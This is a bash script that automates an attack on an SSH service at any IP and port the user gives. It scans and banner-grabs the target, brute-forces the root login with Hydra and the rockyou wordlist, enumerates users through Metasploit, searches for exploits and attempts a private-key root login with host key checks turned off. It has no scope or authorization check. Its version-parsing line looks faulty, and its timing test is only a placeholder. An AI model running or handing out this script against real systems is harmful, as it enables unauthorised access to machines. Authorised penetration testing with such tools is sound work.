#!/bin/bash

# Check if target IP and port are provided
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <target-IP> <port>"
  exit 1
fi

TARGET_IP=$1
PORT=$2
OUTPUT_FILE="ssh_${TARGET_IP}_${PORT}_results.txt"

echo "Starting SSH Penetration Testing on $TARGET_IP:$PORT..."
echo "Results will be saved to $OUTPUT_FILE."

# Initialize the output file
{
  echo "SSH Penetration Testing Results for $TARGET_IP:$PORT"
  echo "====================================================="
  echo
} | tee $OUTPUT_FILE

# 1. Scan for the specified port
echo "[*] Scanning for open SSH port ($PORT)..." | tee -a $OUTPUT_FILE
echo "=== Port Scan ===" | tee -a $OUTPUT_FILE
nmap -p $PORT $TARGET_IP | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Port scan completed and added to results."

# 2. Perform service and version detection
echo "[*] Performing service and version detection..." | tee -a $OUTPUT_FILE
echo "=== Service and Version Detection ===" | tee -a $OUTPUT_FILE
nmap -p $PORT -sV --script=ssh2-enum-algos $TARGET_IP | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Service and version detection completed and added to results."

# 3. Grab the SSH banner
echo "[*] Grabbing the SSH banner..." | tee -a $OUTPUT_FILE
echo "=== SSH Banner ===" | tee -a $OUTPUT_FILE
(echo | nc $TARGET_IP $PORT) | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] SSH banner captured and added to results."

# 4. Enumerate supported algorithms
echo "[*] Enumerating supported algorithms..." | tee -a $OUTPUT_FILE
echo "=== Supported Algorithms ===" | tee -a $OUTPUT_FILE
ssh-audit $TARGET_IP:$PORT -n | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Supported algorithms enumerated and added to results."

# 5. Check for weak or default credentials
echo "[*] Checking for weak or default credentials using Hydra..." | tee -a $OUTPUT_FILE
echo "=== Weak or Default Credentials ===" | tee -a $OUTPUT_FILE
hydra -l root -P ~/wordlists/rockyou.txt ssh://$TARGET_IP:$PORT | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Weak credential check completed and added to results."

# 6. Search for SSH version vulnerabilities
echo "[*] Searching for vulnerabilities in the detected SSH version..." | tee -a $OUTPUT_FILE
SSH_VERSION=$(grep "OpenSSH" $OUTPUT_FILE | awk '{print $2}')
echo "=== SSH Vulnerabilities (Version: $SSH_VERSION) ===" | tee -a $OUTPUT_FILE
searchsploit $SSH_VERSION | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Vulnerability search completed and added to results."

# 7. Check for known CVEs using Nmap
echo "[*] Checking for known vulnerabilities using Nmap scripts..." | tee -a $OUTPUT_FILE
echo "=== Known CVEs ===" | tee -a $OUTPUT_FILE
nmap --script sshv1,ssh2-enum-algos -p $PORT $TARGET_IP | tee -a $OUTPUT_FILE
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Known CVE check completed and added to results."

# 8. Enumerate users (if supported)
echo "[*] Enumerating users..." | tee -a $OUTPUT_FILE
echo "=== User Enumeration ===" | tee -a $OUTPUT_FILE
metasploit_command="use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $TARGET_IP; set RPORT $PORT; run"
echo "$metasploit_command" | tee -a $OUTPUT_FILE
msfconsole -x "$metasploit_command" | tee -a $OUTPUT_FILE

# 9. Test SSH login with a known private key (if available)
echo "[*] Testing login with a known private key (if keyfile exists)..." | tee -a $OUTPUT_FILE
echo "=== Private Key Login Test ===" | tee -a $OUTPUT_FILE
if [ -f "./private_key.pem" ]; then
  ssh -i ./private_key.pem root@$TARGET_IP -p $PORT -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 2>&1 | tee -a $OUTPUT_FILE
  echo "[+] Private key login test completed." | tee -a $OUTPUT_FILE
else
  echo "[-] No private key file found for testing." | tee -a $OUTPUT_FILE
fi
echo | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE
echo "[+] Private key login test added to results."

# 10. Test for keystroke timing attacks (if applicable)
echo "[*] Testing for keystroke timing vulnerabilities..." | tee -a $OUTPUT_FILE
echo "=== Keystroke Timing Test ===" | tee -a $OUTPUT_FILE
# Placeholder for keystroke timing tests; implement if tool available.
echo "[+] Keystroke timing attack test placeholder added to results." | tee -a $OUTPUT_FILE
echo "---------------------------------------------" | tee -a $OUTPUT_FILE

# Final summary
echo "SSH Penetration Testing Completed for $TARGET_IP:$PORT." | tee -a $OUTPUT_FILE
echo "All results have been consolidated into $OUTPUT_FILE." | tee -a $OUTPUT_FILE
echo "[+] Full penetration test completed successfully."
